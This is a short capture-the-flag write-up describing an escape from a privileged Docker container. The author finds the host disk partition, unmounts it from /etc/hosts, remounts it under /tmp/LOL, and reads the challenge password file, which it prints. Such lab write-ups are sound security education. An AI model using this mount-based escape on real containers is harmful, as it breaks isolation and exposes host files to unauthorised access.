---
layout: default
title: Docker-I-am-Groot
---
In this challenge we are the root on a docker, and need to escape it.

I checked for block devices, and found 4 block devices:
```bash
root@h3yd0ck3r:~# find /dev -type b
/dev/sda5
/dev/sda2
/dev/sda1
/dev/sda
```

Then, I checked for the block devices and their mounting points:

```bash
root@h3yd0ck3r:~# lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   20G  0 disk
├─sda1   8:1    0   19G  0 part /etc/hosts
├─sda2   8:2    0    1K  0 part
└─sda5   8:5    0  975M  0 part [SWAP]
```

We can see `/dev/sda1` is mounted to `/etc/hosts`, on the real file system.
Let's unmount it using `umount`, and then mount using it the `/` folder to temp folder we'll create
```bash
root@h3yd0ck3r:~# umount /dev/sda1
root@h3yd0ck3r:~# mkdir /tmp/LOL -p
root@h3yd0ck3r:~# mount /dev/sda1 /tmp/LOL
```

After doing that, we can simply access all files via `/tmp/LOL`.
![Pasted image 20260310141837.png](./images/images/Pasted image 20260310141837.png)

Grab the password:
```bash
root@h3yd0ck3r:~# cat /tmp/LOL/.passwd
b95d3d00d5336d16d7f27454ebe9cc58
```